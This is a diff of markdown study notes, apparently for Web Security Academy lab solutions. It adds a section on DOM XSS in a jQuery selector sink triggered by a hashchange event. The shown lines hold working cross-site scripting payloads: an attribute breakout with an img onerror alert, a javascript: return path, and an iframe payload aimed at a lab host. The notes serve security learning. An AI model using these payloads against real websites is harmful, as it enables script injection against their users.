@@ -37,3 +37,12 @@ use ```storeId="></select><img src=1 onerror=alert(1)>```.
 Using herf alert.
 ```returnPath=javascript:alert('1')``` in link.
 
+<br>
+
+### DOM XSS in jQuery selector sink using a hashchange event
+Readings:
+
+[```What is "><img src=x onerror=prompt(1);>?```](https://www.quora.com/What-is-img-src-x-onerror-prompt-1)
+
+```<iframe src="https://ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>```
+
